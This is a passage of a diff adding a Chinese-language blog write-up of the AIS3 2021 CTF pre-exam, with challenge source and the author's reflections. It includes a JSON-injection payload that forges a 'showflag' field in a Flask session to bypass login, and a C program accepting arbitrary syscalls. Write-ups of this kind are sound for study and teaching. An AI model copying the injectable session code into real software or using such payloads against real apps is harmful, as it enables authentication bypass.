+        <span style="color:#66d9ef">return</span> users_db<span style="color:#f92672">.</span>get(user[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">==</span> user[<span style="color:#e6db74">&#39;password&#39;</span>]
+
+    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;user_data&#39;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> session:
+        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Login Please :D&#34;</span>)
+
+    user <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(session[<span style="color:#e6db74">&#39;user_data&#39;</span>])
+    <span style="color:#66d9ef">if</span> valid_user(user):
+        <span style="color:#66d9ef">if</span> user[<span style="color:#e6db74">&#39;showflag&#39;</span>] <span style="color:#f92672">==</span> True <span style="color:#f92672">and</span> user[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;guest&#39;</span>:
+            <span style="color:#66d9ef">return</span> FLAG
+        <span style="color:#66d9ef">else</span>:
+            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;welcome.html&#34;</span>, username<span style="color:#f92672">=</span>user[<span style="color:#e6db74">&#39;username&#39;</span>])
+
+    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>, message<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Verify Failed :(&#34;</span>)
+
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/login&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;POST&#39;</span>])
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
+    data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;showflag&#34;: false, &#34;username&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;, &#34;password&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;}&#39;</span> <span style="color:#f92672">%</span> (
+        request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;username&#34;</span>], request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#39;password&#39;</span>]
+    )
+    session[<span style="color:#e6db74">&#39;user_data&#39;</span>] <span style="color:#f92672">=</span> data
+    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/&#34;</span>)
+
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/logout&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
+    session<span style="color:#f92672">.</span>clear()
+    <span style="color:#66d9ef">return</span> redirect(<span style="color:#e6db74">&#34;/&#34;</span>)
+
+
+<span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/sauce&#34;</span>)
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sauce</span>():
+    <span style="color:#66d9ef">return</span> send_file(__file__, mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain&#34;</span>)
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    app<span style="color:#f92672">.</span>run(threaded<span style="color:#f92672">=</span>True, debug<span style="color:#f92672">=</span>True)
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json
+<span style="color:#f92672">import</span> os
+
+users_db <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#39;guest&#39;</span> : <span style="color:#e6db74">&#39;guest&#39;</span>,
+    <span style="color:#e6db74">&#39;admin&#39;</span>: os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;S3CR3T_P455W0RD&#39;</span>)
+}
+
+username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sloth&#34;, &#34;showflag&#34;: true, &#34;foo&#34;:&#34;&#39;</span>
+password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#34;, &#34;password&#34;: null, &#34;foo&#34;:&#34;&#39;</span>
+
+data <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{&#34;showflag&#34;: false, &#34;username&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;, &#34;password&#34;: &#34;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;}&#39;</span> <span style="color:#f92672">%</span> (
+    username, password
+)
+user <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(data)
+
+<span style="color:#66d9ef">if</span> users_db<span style="color:#f92672">.</span>get(user[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">==</span> user[<span style="color:#e6db74">&#39;password&#39;</span>]:
+    <span style="color:#66d9ef">if</span> user[<span style="color:#e6db74">&#39;showflag&#39;</span>] <span style="color:#f92672">==</span> True <span style="color:#f92672">and</span> user[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;guest&#39;</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;SUCCESS&#34;</span>) <span style="color:#75715e"># bypass checks</span>
+</code></pre></div><p><code>AIS3{/r/badUIbattles?!?!}</code></p>
+<hr>
+<h1 id="misc">
+  MISC
+  <a class="heading-link" href="#misc">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<h2 id="microcheese">
+  Microcheese
+  <a class="heading-link" href="#microcheese">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<p><figure><img src="/img/ais3_2021/pre_exam/microcheese01.png"/>
+</figure>
+
+<figure><img src="/img/ais3_2021/pre_exam/microcheese02.png"/>
+</figure>
+</p>
+<hr>
+<h2 id="blind">
+  Blind
+  <a class="heading-link" href="#blind">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;fcntl.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/syscall.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+<span style="color:#66d9ef">int</span> syscall_black_list[] <span style="color:#f92672">=</span> {};
+
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">make_a_syscall</span>()
+{
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> rax, rdi, rsi, rdx;
+    scanf(<span style="color:#e6db74">&#34;%llu %llu %llu %llu&#34;</span>, <span style="color:#f92672">&amp;</span>rax, <span style="color:#f92672">&amp;</span>rdi, <span style="color:#f92672">&amp;</span>rsi, <span style="color:#f92672">&amp;</span>rdx);
+    syscall(rax, rdi, rsi, rdx);
+}
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+{
+    setvbuf(stdin, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+    setvbuf(stdout, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0</span>);
+    puts(<span style="color:#e6db74">&#34;You can call a system call, then I will open the flag for you.&#34;</span>);
+    puts(<span style="color:#e6db74">&#34;Input: [rax] [rdi] [rsi] [rdx]&#34;</span>);
+    close(<span style="color:#ae81ff">1</span>);
+    make_a_syscall();
+    <span style="color:#66d9ef">int</span> fd <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;flag&#34;</span>, O_RDONLY);
+    <span style="color:#66d9ef">char</span> flag[<span style="color:#ae81ff">0x100</span>];
+    size_t flag_len <span style="color:#f92672">=</span> read(fd, flag, <span style="color:#ae81ff">0xff</span>);
+    write(<span style="color:#ae81ff">1</span>, flag, flag_len);
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p><code>AIS3{dupppppqqqqqub}</code></p>
+<p>又學到了一個這輩子大概不會再用到的syscall</p>
+<hr>
+<h2 id="cat-slayer-fake">
+  Cat Slayer <em>Fake</em>
+  <a class="heading-link" href="#cat-slayer-fake">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h2>
+<hr>
+<h1 id="結果與心得">
+  結果與心得
+  <a class="heading-link" href="#%e7%b5%90%e6%9e%9c%e8%88%87%e5%bf%83%e5%be%97">
+    <i class="fa fa-link" aria-hidden="true"></i>
+  </a>
+</h1>
+<p>再次體會到自己很菜</p>
+<p>然後第一次寫writeup就已經累到不想再寫第二次了。</p>
+<figure><img src="/img/ais3_2021/pre_exam/pre_exam_score.png"/>
+</figure>
+
+<ol start="0">
+<li>
+<p>REVERSE 就是地獄，每次看到新的題形都會很想死，不過做過一次後通常就會覺的類似的題形很簡單了，相當吃經驗的領域。</p>
+</li>
+<li>
+<p>PWN 該學UAF和Heap Exploits了，不然每次都只能解水題，話說今年怎麼好像沒看到Format String?然後Noper居然還是這次解的題目裡分數最高的&hellip;比殺了我好多腦細胞的Colors分數還高到底是怎麼回事？PWN真香。</p>
+</li>
+<li>
+<p>CRYPTO 我真的有夠菜，解不出來只能在路邊CRY</p>
+</li>
+<li>
+<p>WEB 到底哪裡好入門了，到底是誰說很好入門的？</p>
+</li>
+</ol>
+<p>最後一天一題都沒解出來，當天還砸了六個小時在某題Reverse上。明明就只差最後一小步了&hellip;不過沒解出來就是沒解出來，只能眼睜睜看著自己從前二十名掉到第四十&hellip;</p>
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+      
+        ©
+        
+        2021
+         x2w 
+      
+      
+         · 
+        技術支援 <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+      
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+      <script src="/js/coder.min.235666b114443867d43eeb5799d51f6252965e5163f338285e113fa381d3d27e.js" integrity="sha256-I1ZmsRREOGfUPutXmdUfYlKWXlFj8zgoXhE/o4HT0n4="></script>
+    
+
+    
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-197567679-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+  </body>
+
+</html>
